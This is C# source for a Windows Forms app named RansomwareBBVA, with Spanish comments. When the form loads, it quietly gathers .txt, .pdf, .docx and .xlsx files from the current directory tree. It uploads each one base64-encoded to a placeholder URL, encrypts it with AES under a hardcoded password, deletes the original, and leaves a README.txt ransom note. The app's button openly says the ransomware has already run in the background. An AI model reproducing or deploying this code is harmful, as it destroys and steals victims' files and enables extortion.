using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Net;
using System.Collections.Specialized;

namespace RansomwareBBVA
{

    public partial class Form1 : Form
    {
        //  Call this function to remove the key from memory after use for security
        //[DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        //public static extern bool ZeroMemory(IntPtr Destination, int Length);

   
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    
                    rng.GetBytes(data);
                }
            }

            return data;
        }

      
        private void FileEncrypt(string inputFile, string password)
        {

            
            //http://stackoverflow.com/questions/27645527/aes-encryption-on-large-files

           
            byte[] salt = GenerateRandomSalt();

           
            FileStream fsCrypt = new FileStream(inputFile + ".Ransom", FileMode.Create);

            
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
           
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

           
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
                File.Delete(inputFile);//elimina el archivo original
            }
        }

       
        private void FileDecrypt(string inputFile, string outputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CFB;

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fsOut = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents();
                    fsOut.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fsOut.Close();
                fsCrypt.Close();
            }
        }

        private void exfiltrar(string archivo)
        {
            try
            {
                Byte[] bytes = File.ReadAllBytes(archivo);
                String file = Convert.ToBase64String(bytes);
                var wb = new WebClient();
                string url = "URL";
                var data = new NameValueCollection();

                data["narchivo"] = archivo;
                data["contenido"] = file;
                var response = wb.UploadValues(url, "POST", data);
            }
            catch(Exception e)
            {
                MessageBox.Show(e.Message, "error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            //WebResponse ws = request.GetResponse();
            //MessageBox.Show(file,"exfiltrando...");
        }
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("No importa la funcionalidad del boton, al iniciar la aplicación se ejecutó en background el ransomware","Centro de Software",MessageBoxButtons.OK,MessageBoxIcon.Information);   
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
            if (backgroundWorkerTXT.IsBusy != true)
            {
                backgroundWorkerTXT.RunWorkerAsync();//Proceso en background que escribe el TXT con el mensaje del ransomware
            }
        }

        private void backgroundWorkerTXT_DoWork(object sender, DoWorkEventArgs e)
        {
            

            //identifica los archivos a cifrar
            List<string> archivos = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.*", SearchOption.AllDirectories)
                                      .Where(file => new string[] { ".txt", ".pdf", ".docx", ".xlsx" }
                                      .Contains(Path.GetExtension(file)))
                                      .ToList();

            string password = "SuperPasswd123!!";
            // For additional security Pin the password of your files
            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);

            foreach(string f in archivos)
            {

                exfiltrar(f);
                FileEncrypt(f, password);
            }

            
        }

        private void backgroundWorkerTXT_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            string msgTXT = @"mensaje aqui
                ";

            //Crea el TXT con el mensaje del ransomware
            File.WriteAllText(@"README.txt", msgTXT);

        }
    }
}
